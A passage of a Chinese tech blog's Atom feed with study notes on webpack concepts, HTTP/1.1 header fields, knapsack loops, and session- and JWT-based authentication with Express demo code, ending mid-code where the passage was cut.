    <id>https://coloey.github.io/2022/04/10/wepack%E4%BA%94%E4%B8%AA%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/</id>
    <published>2022-04-10T04:05:22.000Z</published>
    <updated>2022-04-10T09:32:42.293Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Entry"><a href="#Entry" class="headerlink" title="Entry:"></a>Entry:</h1><p>入口（Entry)指示Webpack以哪个文件为入口起点开始打包</p><p>Output:</p><p>输出（output)指示Webpack打包后的资源bundle输出到哪里，以及如何命名</p><h1 id="Loader"><a href="#Loader" class="headerlink" title="Loader:"></a>Loader:</h1><p>Loader让Webpack能够去处理那些非JavaScript文件（webpack自身只理解JavaScript)</p><p>loader 用于对模块的源代码进行转换。loader 可以使你在 <code>import</code> 或”加载”模块时预处理文件。因此，loader 类似于其他构建工具中“任务(task)”，并提供了处理前端构建步骤的强大方法。loader 可以将文件从不同的语言（如 TypeScript）转换为 JavaScript，或将内联图像转换为 data URL。loader 甚至允许你直接在 JavaScript 模块中 <code>import</code> CSS文件！</p><h1 id="Plugins"><a href="#Plugins" class="headerlink" title="Plugins:"></a>Plugins:</h1><p>插件(Plugins)可以用于执行范围更广的任务，插件的范围包括从打包优化到压缩，一直到重新定义环境中的变量等</p><h1 id="Mode"><a href="#Mode" class="headerlink" title="Mode:"></a>Mode:</h1><p>模式（Mode）指示Webpack使用相应模式的配置</p><table><thead><tr><th>选项</th><th>描述</th><th>特点</th></tr></thead><tbody><tr><td>development</td><td>会将process.env.NODE_ENV的值设为development,启用NamedChunksPlugin和NamedModulesPlugin</td><td>能让代码在本地调试运行的环境</td></tr><tr><td>production</td><td>会将 <code>process.env.NODE_ENV</code> 的值设为 <code>production</code>。启用 <code>FlagDependencyUsagePlugin</code>, <code>FlagIncludedChunksPlugin</code>, <code>ModuleConcatenationPlugin</code>, <code>NoEmitOnErrorsPlugin</code>, <code>OccurrenceOrderPlugin</code>, <code>SideEffectsFlagPlugin</code> 和 <code>UglifyJsPlugin</code></td><td>能让代码优化上线运行的环境</td></tr></tbody></table><h1 id="运行指令"><a href="#运行指令" class="headerlink" title="运行指令"></a>运行指令</h1><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>webpack  ./src/index.js -o ./build/build.js –mode=development:webpack会以./src/index.js为入口打包文件，打包后输出到./build/build.js，整体打包环境，是开发环境</p><h2 id="生成环境"><a href="#生成环境" class="headerlink" title="生成环境"></a>生成环境</h2><p>webpack ./src/index.js-o ./build/build.js –mode=production,webpack会以./src/index.js为入口打包文件，打包后输出到./build/build.js，整体打包环境，是生产环境</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><ul><li>webpack能处理js/json资源，不能处理css/img等其他资源</li><li>生产环境和开发环境将ES6模块化编译成浏览器能识别的模块化</li><li>生产环境比开发环境多一个压缩的js代码</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Entry&quot;&gt;&lt;a href=&quot;#Entry&quot; class=&quot;headerlink&quot; title=&quot;Entry:&quot;&gt;&lt;/a&gt;Entry:&lt;/h1&gt;&lt;p&gt;入口（Entry)指示Webpack以哪个文件为入口起点开始打包&lt;/p&gt;
&lt;p&gt;Output:&lt;/p&gt;
&lt;p&gt;输</summary>
      
    
    
    
    <category term="webpack" scheme="https://coloey.github.io/categories/webpack/"/>
    
    
  </entry>
  
  <entry>
    <title>HTTP首部字段</title>
    <link href="https://coloey.github.io/2022/04/09/HTTP%E9%80%9A%E7%94%A8%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5/"/>
    <id>https://coloey.github.io/2022/04/09/HTTP%E9%80%9A%E7%94%A8%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5/</id>
    <published>2022-04-09T08:13:43.000Z</published>
    <updated>2022-04-11T13:35:32.923Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTTP报文首部"><a href="#HTTP报文首部" class="headerlink" title="HTTP报文首部"></a>HTTP报文首部</h1><p>HTTP请求报文由请求行（方法，URI，HTTP版本），HTTP首部字段等部分构成。</p><p>HTTP响应报文由状态行（HTTP版本，状态码（数字和原因短语））HTTP首部字段3部分构成。</p><h1 id="4种HTTP首部字段类型"><a href="#4种HTTP首部字段类型" class="headerlink" title="4种HTTP首部字段类型"></a>4种HTTP首部字段类型</h1><p>通用首部字段：请求报文和响应报文都会使用的首部</p><p>请求首部字段：从客户端向服务端发送报文时使用的首部，补充了请求的附加内容，客户端信息，响应内容相关优先级等信息</p><p>响应首部字段：从服务器端向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息</p><p>实体首部字段：针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的信息</p><h1 id="HTTP-1-1通用首部字段"><a href="#HTTP-1-1通用首部字段" class="headerlink" title="HTTP/1.1通用首部字段"></a>HTTP/1.1通用首部字段</h1><h2 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h2><p>通过指定首部字段Cache-Control的指令，就能操作缓存的工作机制。</p><blockquote><p>Cache-Control:private,max-age=0,no-cache</p></blockquote><p>缓存请求指令：</p><table><thead><tr><th>指令</th><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>no-cache</td><td>无</td><td>强制向源服务器再次验证</td></tr><tr><td>no-store</td><td>无</td><td>不缓存请求或响应的任何内容</td></tr><tr><td>max-age=([秒])</td><td>必需</td><td>响应的最大Age值</td></tr><tr><td>max-stale=([秒])</td><td>可省略</td><td>接收已过期的响应</td></tr><tr><td>min-fresh=[秒]</td><td>必需</td><td>期望在指定时间内的响应仍有效</td></tr><tr><td>no-transform</td><td>无</td><td>代理不接更改媒体类型</td></tr><tr><td>only-if-cached</td><td>无</td><td>从缓存中获取资源</td></tr><tr><td>cache-extension</td><td></td><td>新指令标记（token)</td></tr></tbody></table><p>缓存响应指令</p><table><thead><tr><th>指令</th><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>public</td><td>无</td><td>可向任意方提供响应的缓存</td></tr><tr><td>private</td><td>可省略</td><td>仅向特定用户返回响应</td></tr><tr><td>no-cache</td><td>可省略</td><td>缓存前必须先确认其有效性</td></tr><tr><td>no-store</td><td>无</td><td>不缓存请求或响应的任何内容</td></tr><tr><td>no-transform</td><td>无</td><td>代理不接更改媒体类型</td></tr><tr><td>must-revalidate</td><td>无</td><td>可缓存但必须再向服务器进行确认</td></tr><tr><td>proxy-revalidate</td><td>无</td><td>要求中间缓存服务器对缓存的响应有效性再进行确认</td></tr><tr><td>max-age=[秒]</td><td>必需</td><td>响应的最大Age值</td></tr><tr><td>s-maxage=[秒]</td><td>必需</td><td>公共缓存服务器响应的最大Age值</td></tr><tr><td>cache-extension</td><td>-</td><td>新指令标记（token)</td></tr></tbody></table><h3 id="no-cache指令"><a href="#no-cache指令" class="headerlink" title="no-cache指令"></a>no-cache指令</h3><p>Cache-Control:no-cache</p><p>使用no-cache指令的目的是为了防止从缓存中返回过期的资源，缓存会向源服务器进行有效期的确认后处理资源</p><p>客户端：发送的请求中包含no-cache指令，则表示客户端将不会接收缓存过的响应。于是“中间”缓存服务器必须把客户端请求转发给源服务器</p><p>服务器：如果服务器返回的响应中包含no-cache指令，那么缓存服务器不能对资源进行缓存，源服务器以后也不再对缓存服务器请求中提出的资源有效性进行确认，且禁止其对响应资源进行缓存操作</p><p>Cache-Control:no-cache=Location</p><p>由服务器返回的响应中，若报文首部字段Cache-Control中对no-cache字段名具体指定参数值，那么客户端在接收到这个被指定参数值的首部字段对应的响应报文后，就不能使用缓存。相反，无参数值的首部字段可以使用缓存。只能在响应指令中指定该参数</p><h3 id="no-store指令"><a href="#no-store指令" class="headerlink" title="no-store指令"></a>no-store指令</h3><p>Cache-Control:no-store</p><p>当使用no-store指令时，暗示请求（和对应的响应）或响应中包含机密信息，因此该指令规定缓存不能在本地存储请求或响应的任何一部分</p><h3 id="s-maxage指令"><a href="#s-maxage指令" class="headerlink" title="s-maxage指令"></a>s-maxage指令</h3><p>Cache-Control:s-maxage=604800(单位：秒)</p><p>s-maxage指令的功能和max-age指令相同，不同点在于s-maxage指令只适用于供多位用户使用的公共缓存服务器，对于向同一用户重复返回响应的服务器来说，这个指令没有任何作用。</p><p>当使用s-maxage指令后，则直接忽略对Expires首部字段及max-age指令的处理</p><h3 id="max-age指令"><a href="#max-age指令" class="headerlink" title="max-age指令"></a>max-age指令</h3><p>Cache-Control:max-age=604800(单位：秒)</p><p>客户端：当客户端发送的请求中包含max-age指令时，如果判定缓存时间的数值比·1指定时间的数值更小，那么客户端就接收缓存的资源。当指定的max-age=0，那么缓存服务器通常将请求转发给源服务器</p><p>服务端：服务器返回的响应中包含max-age指令，缓存服务器将不对资源的有效性再作确认，而max-zge数值代表资源保存为缓存的最长时间</p><p>⚠应用HTTP/1.1版本的缓存服务器在遇到同时存在Expires首部字段的情况时，会优先处理max-age指令,而忽略Expires首部字段，而HTTP/1.0版本的缓存服务器则相反，max-age指令被忽略</p><h3 id="min-fresh指令"><a href="#min-fresh指令" class="headerlink" title="min-fresh指令"></a>min-fresh指令</h3><p>Cache-Control:min-fresh=60</p><p>min-fresh指令要求缓存服务器返回至少还未过指定时间的缓存资源。</p><h3 id="max-stale指令"><a href="#max-stale指令" class="headerlink" title="max-stale指令"></a>max-stale指令</h3><p>Cache-Control:max-stale=3600</p><p>使用max-stale指示缓存资源，即使过期也照常接收</p><p>如果指令未指定参数值，那么无论过多久，客户端都会接收响应；如果指令中指定了具体数值，那么即使过期，只要仍处于max-stale指定的时间内仍旧会被客户端接收</p><h3 id="only-if-cached指令"><a href="#only-if-cached指令" class="headerlink" title="only-if-cached指令"></a>only-if-cached指令</h3><p>Cache-Control:only-if-cached</p><p>表示客户端仅在缓存服务器本地缓存目标资源的情况下才要求其返回。该指令要求服务器不重新加载响应，也不再次确认资源有效性。若请求缓存服务器的本地缓存无响应，则返回状态码504 Gateway Timeout</p><h3 id="must-revalidate指令"><a href="#must-revalidate指令" class="headerlink" title="must-revalidate指令"></a>must-revalidate指令</h3><p>Cache-Control:must-revalidate</p><p>代理向源服务器再次验证即将返回的响应缓存目前是否仍然有效。如果代理无法连通服务器再次活期有效资源，缓存必须给客户端一条504状态码</p><p>使用must-revalidate指令忽略请求的max-stale指令，即使首部使用了max-stale，也不会有效果</p><h3 id="proxy-revalidate指令"><a href="#proxy-revalidate指令" class="headerlink" title="proxy-revalidate指令"></a>proxy-revalidate指令</h3><p>Cache-Control：proxy-revalidate</p><p>proxy-revalidate要求所有缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性</p><h3 id="no-transform指令"><a href="#no-transform指令" class="headerlink" title="no-transform指令"></a>no-transform指令</h3><p>Cache-Control：no-transform</p><p>无论·是在请求还是响应中使用，缓存都不能改变实体主体的媒体类型，这样可防止代理压缩图片等类似操作</p><h3 id="Cache-Control扩展"><a href="#Cache-Control扩展" class="headerlink" title="Cache-Control扩展"></a>Cache-Control扩展</h3><p>cache-control token</p><p>Cache-Control:private,community=”UCI”</p><p>通过cache-extension标记可以扩展Cache-Control首部字段内的指令。如例子，Cache-Control首部字段本身没有community这个指令。借助extensions tokens实现了该指令的添加。如果缓存服务器无法理解这个新指令就会直接忽略</p><h2 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h2><p>作用：</p><ul><li>控制不再转发给代理的首部字段</li><li>管理持久连接</li></ul><p>Connection:不再转发的首部字段名</p><h3 id="控制不再转发给代理的首部字段"><a href="#控制不再转发给代理的首部字段" class="headerlink" title="控制不再转发给代理的首部字段"></a>控制不再转发给代理的首部字段</h3><p>在客户端发送请求和服务器返回响应内，使用Connection首部字段，可控制不再转发给代理的首部字段</p><h3 id="管理持久连接"><a href="#管理持久连接" class="headerlink" title="管理持久连接"></a>管理持久连接</h3><p>Connection:close</p><p>HTTP/1.1版本的默认连接是持久连接，为此，客户端会在持久连接上连续发送请求。当服务器端想明确断开连接时，指定Connection首部字段为Close</p><p>HTTP/1.1之前的版本默认连接是非持久连接。因此，如果想要在旧版本的HTTP协议上维持持续连接，则需要指定Connection为Kepp-Alive</p><h2 id="Pragma"><a href="#Pragma" class="headerlink" title="Pragma"></a>Pragma</h2><p>Pragma是HTTP/1.1之前版本的历史遗留字段，仅作为与HTTP/1.0的向后兼容而定义</p><p>Pragma:no-cache</p><p>该首部字段属于通用首部字段，但只用在客户端发送请求中。客户端要求所有的中间服务器不返回缓存的资源。所有中间服务器如果都能以HTTP/1.1为基准，那直接采用Cache-Control:no-cache指定缓存的处理方式是最为理想的。但要整体掌握中间服务器使用的HTTP协议版本不现实，发送请求一般同时包含两个首部字段</p><blockquote><p>Cache-Control:no-cache</p><p>Pragma:no-cache</p></blockquote><h2 id="Trailer"><a href="#Trailer" class="headerlink" title="Trailer"></a>Trailer</h2><p>首部字段Trailer会事先说明在报文主体后记录了哪些首部字段。该首部字段可应用在HTTP/1.1版本分块传输编码时</p><blockquote><p>Trailer:Expires</p><p>—(报文主体)—</p><p>Expires:Tue,28 Sep 2004 23:59:59 GMT</p></blockquote><h2 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h2><p>规定了传输报文主体时采用的编码方式</p><p>HTTP/1.1的传输编码方式仅对分块传输编码有效</p><p>Upgrade</p><p>Upgrade用于检测HTTP协议及其他协议是否可使用更高的版本进行同心，其参数值用来指定一个完全不同的通信协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">客户端=》服务器</span><br><span class="line">GET/index.html HTTP/1.1</span><br><span class="line">Upgrade:TLS/1.0</span><br><span class="line">Connection:Upgrade</span><br><span class="line">服务器=》客户端</span><br><span class="line">HTTP/1.1 101 Switching Protocols</span><br><span class="line">Upgrade:TLS/1.0,HTTP/1.1</span><br><span class="line">Connection:Upgrade</span><br></pre></td></tr></table></figure><p>Connection的值被指定为Upgrade,Upgrade的首部字段产生作用的Upgrade对象仅限于客户端和邻接服务器之间。因此使用首部字段Upgrade时需要额外指定Connection为Upgrade</p><h2 id="Via"><a href="#Via" class="headerlink" title="Via"></a>Via</h2><p>使用Via是为了追踪客户端和服务器之间的请求和响应报文的传输路径</p><p>报文经过代理或网关时，会现在首部字段Via中附加该服务器的信息，然后再进行转发。Via不仅用于追踪报文的转发，还可避免请求回环的发生，所以必须在经过代理时附加该首部字段内容</p><h2 id="Warning"><a href="#Warning" class="headerlink" title="Warning"></a>Warning</h2><p>HTTP/1.1的Warning首部是从HTTP/1.0的响应首部（Retry-After)演变过来的，该首部会告知用户一些与缓存相关的问题的警告</p><p>&amp;eg:</p><blockquote><p>Warning:113 gw.hackr.jp:8080 “Heuristic expiration” Tue,03 Jul=&gt;2012 05:09:44 GMT</p><p>Warning:【警告码】【警告主机：端口号】“【警告内容】”（【日期时间】）</p></blockquote><p>HTTP/1.1警告码</p><table><thead><tr><th>警告码</th><th>警告内容</th><th>说明</th></tr></thead><tbody><tr><td>110</td><td>Response is stale(响应已过期)</td><td>代理返回已过期的资源</td></tr><tr><td>111</td><td>Revalidation failed(再验证失败)</td><td>代理验证资源有效性时失败（服务器无法到达等原因</td></tr><tr><td>112</td><td>Disconnection operation(断开连接操作)</td><td>代理与互联网连接故意切断</td></tr><tr><td>113</td><td>Heuristic expiration(试探性过期)</td><td>响应的使用期超过24小时（有效缓存的设定时间大于24小时的情况下）</td></tr><tr><td>199</td><td>Miscellaneous warning(杂项警告)</td><td>任意警告内容</td></tr><tr><td>214</td><td>Transformation applied(使用了转换)</td><td>代理对内容编码或媒体类型等执行了某些处理时</td></tr><tr><td>299</td><td>Miscellaneous  persistent warning(持久杂项警告)</td><td>任意警告内容</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HTTP报文首部&quot;&gt;&lt;a href=&quot;#HTTP报文首部&quot; class=&quot;headerlink&quot; title=&quot;HTTP报文首部&quot;&gt;&lt;/a&gt;HTTP报文首部&lt;/h1&gt;&lt;p&gt;HTTP请求报文由请求行（方法，URI，HTTP版本），HTTP首部字段等部分构成。&lt;/p&gt;</summary>
      
    
    
    
    <category term="HTTP" scheme="https://coloey.github.io/categories/HTTP/"/>
    
    
  </entry>
  
  <entry>
    <title>背包问题</title>
    <link href="https://coloey.github.io/2022/04/04/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/"/>
    <id>https://coloey.github.io/2022/04/04/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/</id>
    <published>2022-04-04T04:01:42.000Z</published>
    <updated>2022-04-08T09:19:01.103Z</updated>
    
    <content type="html"><![CDATA[<p>01背包：有限物品数量</p><p>二维01背包问题，两个for循环可以交换顺序，内层for循环方向可以顺序循环</p><p>一维01背包问题：因为物品数量有限，内层for循环不能重复取，必须倒序，两个for循环可以交换顺序</p><p>完全背包问题：物品可以重复取</p><p>二维：for循环可以交换顺序，内层for循环必须顺序，因为物品可以重复取</p><p>一维：for循环可以交换顺序，内层for循环必须顺序，因为物品可以重复取</p><p>求方法数：dp[j]+=dp[j-nums[i]]</p><p>一维：求组合数：先遍历物品再遍历背包</p><p>求排列数：先遍历背包再遍历物品</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;01背包：有限物品数量&lt;/p&gt;
&lt;p&gt;二维01背包问题，两个for循环可以交换顺序，内层for循环方向可以顺序循环&lt;/p&gt;
&lt;p&gt;一维01背包问题：因为物品数量有限，内层for循环不能重复取，必须倒序，两个for循环可以交换顺序&lt;/p&gt;
&lt;p&gt;完全背包问题：物品可以重复取&lt;</summary>
      
    
    
    
    <category term="算法" scheme="https://coloey.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
  </entry>
  
  <entry>
    <title>前后端身份认证</title>
    <link href="https://coloey.github.io/2022/03/21/%E5%89%8D%E5%90%8E%E7%AB%AF%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/"/>
    <id>https://coloey.github.io/2022/03/21/%E5%89%8D%E5%90%8E%E7%AB%AF%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/</id>
    <published>2022-03-21T06:10:19.000Z</published>
    <updated>2022-04-12T09:45:43.489Z</updated>
    
    <content type="html"><![CDATA[<h1 id="不同身份认证方案："><a href="#不同身份认证方案：" class="headerlink" title="不同身份认证方案："></a>不同身份认证方案：</h1><p>服务端渲染推荐使用Session认证机制</p><p>前后端分离推荐使用JWT认证机制</p><p>Session认证机制</p><h2 id="Cooike"><a href="#Cooike" class="headerlink" title="Cooike:"></a>Cooike:</h2><p>Cookie是存储在用户浏览器中一段不超过4kb的字符串，它由一个名称（Name),y一个值(Value)和几个用于控制Cookie有效期，安全性，使用范围的可选属性组成</p><p>不同域名下的Cookie各自独立，每当客户端发起请求时，会自动把当前域名下所有未过期的Cookie一同发送到服务器。</p><p>Cookie的几大特性：</p><p>自动发送</p><p>域名独立</p><p>过期时限</p><p>4kb限制</p><p>Cookie在身份认证中的作用：</p><p>客户端第一次请求服务器时，服务器通过响应头的形式，向客户端发送一个身份认证的Cookie，客户端会自动将Cookie保存在浏览器中，随后，当客户端浏览器每次请求服务器时浏览器会自动将身份认证相关的Cookie，通过请求头的形式发送给服务器，服务器即可验证客户端身份</p><p>Cookie具有不安全性</p><p>由于Cookie是存储在浏览器中的，因此浏览器也提供了读写Cookie的API，因此Cookie很容易被伪造，不具有安全性，因此Cookie不能存放重要隐私数据</p><h2 id="Session工作原理："><a href="#Session工作原理：" class="headerlink" title="Session工作原理："></a>Session工作原理：</h2><ol><li>客户端把用户ID和密码等登陆信息放入报文的实体部分，通常是以POST请求发送给服务器，而这时使用HTTPS通信来进行HTML表单画面的显示和用户输入数据的发送</li><li>服务器会发放用以识别用户的Session ID,通过验证从客户端送过来的登录信息进行身份认证，人后把用户认证状态与Session ID绑定后记录在服务器端，向客户端返回响应时，会在首部字段Set-Cookie内写入Sessin ID,为避免SessionId被盗，可在Cookie中加入httponly属性</li><li>客户端接收到从服务器发来的Session ID后，会将其作为Cookie保存哎本地，下次向服务器发送请求时，浏览器自动发送Cookie,服务器通过验证接收到的Session ID识别用户和其认证状态</li></ol><p><img src="/2022/03/21/%E5%89%8D%E5%90%8E%E7%AB%AF%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/Session.jpg"></p><p>Session认证需要配合Cookie实现，由于Cookie默认不支持跨域访问，所以当涉及前端跨域请求后端接口时需要做额外配置。因此当前端请求后端接口不涉及跨域请求时推荐使用Session身份认证机制，否则使用JWT认证</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express=<span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session=<span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cors=<span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser=<span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="comment">//var formParser=require(&#x27;express-formidable&#x27;)</span></span><br><span class="line"><span class="keyword">const</span> app=express();</span><br><span class="line">app.use(cors());</span><br><span class="line">app.use(</span><br><span class="line">    session(&#123;</span><br><span class="line">        <span class="attr">secret</span>:<span class="string">&#x27;xiaoqi&#x27;</span>,</span><br><span class="line">        <span class="attr">resave</span>:<span class="literal">false</span>,</span><br><span class="line">        <span class="attr">saveUninitialized</span>:<span class="literal">true</span></span><br><span class="line">    &#125;)</span><br><span class="line">)</span><br><span class="line"><span class="comment">//托管静态页面</span></span><br><span class="line">app.use(express.static(<span class="string">&#x27;./pages&#x27;</span>));</span><br><span class="line"><span class="comment">//自定义解析Post提交过来的表单数据</span></span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>:<span class="literal">false</span>&#125;))</span><br><span class="line">app.use(bodyParser.json())</span><br><span class="line"><span class="comment">//登录API接口</span></span><br><span class="line">app.post(<span class="string">&#x27;/api/login&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//判断用户提交的登录信息是否正确</span></span><br><span class="line">    <span class="built_in">console</span>.log(req.body)</span><br><span class="line">    <span class="keyword">if</span>(req.body.username!==<span class="string">&quot;admin&quot;</span>||req.body.password!==<span class="string">&quot;888888&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">status</span>:<span class="number">1</span>,<span class="attr">msg</span>:<span class="string">&#x27;登录失败&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//登录成功则把信息存储在Session中</span></span><br><span class="line">    <span class="built_in">console</span>.log(req.body);</span><br><span class="line">    req.session.user=req.body;<span class="comment">//用户登录信息</span></span><br><span class="line">    req.session.islogin=<span class="literal">true</span>;<span class="comment">//用户登录状态</span></span><br><span class="line">    res.send(&#123;<span class="attr">status</span>:<span class="number">0</span>,<span class="attr">msg</span>:<span class="string">&#x27;登录成功&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//获取用户姓名的接口</span></span><br><span class="line">app.get(<span class="string">&#x27;/api/username&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//从Session中获取用户姓名响应给客户端</span></span><br><span class="line">    <span class="keyword">if</span>(!req.session.islogin)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">status</span>:<span class="number">1</span>,<span class="attr">msg</span>:<span class="string">&#x27;fail&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    res.send(&#123;</span><br><span class="line">        <span class="attr">status</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="attr">msg</span>:<span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">        <span class="attr">username</span>:req.session.user.username,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//退出登录的接口</span></span><br><span class="line">app.post(<span class="string">&#x27;/api/logout&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//清空当前客户端的session信息</span></span><br><span class="line">    req.session.destroy()</span><br><span class="line">    res.send(&#123;</span><br><span class="line">        <span class="attr">status</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="attr">msg</span>:<span class="string">&#x27;退出登录成功&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">app.listen(<span class="number">80</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;运行在http://127.0.0.1&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="JWT认证机制："><a href="#JWT认证机制：" class="headerlink" title="JWT认证机制："></a>JWT认证机制：</h2><p>工作原理</p><p><img src="/2022/03/21/%E5%89%8D%E5%90%8E%E7%AB%AF%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/jwt.jpg" alt="jwt"></p><p>jwt组成部分：</p><p>头部.有效荷载.签名</p><p>Header.PayLoad.Signature</p><p>客户端收到服务器返回的JWT后，通常会将它存储在localStorage或者sessionStorage中，此后客户端每次与服务端通信，都要带上这个JWT的字符串，进行身份认证，推荐把JWT放在Http请求头的Authorization字段中</p><blockquote><p>Authorization：Bearer <token></token></p></blockquote><p>在Express中使用JWT</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express=<span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app=express();</span><br><span class="line"><span class="keyword">const</span> cors=<span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line"><span class="comment">//导入用于生成jwt字符串的包</span></span><br><span class="line"><span class="keyword">const</span> jwt=<span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="comment">//导入用于将客户端发送过来的JWT字符串解析还原成JSON对象的包</span></span><br><span class="line"><span class="keyword">const</span> expressJWT=<span class="built_in">require</span>(<span class="string">&quot;express-jwt&quot;</span>);</span><br><span class="line"><span class="comment">//秘钥的本质是字符串</span></span><br><span class="line"><span class="keyword">const</span> secretkey=<span 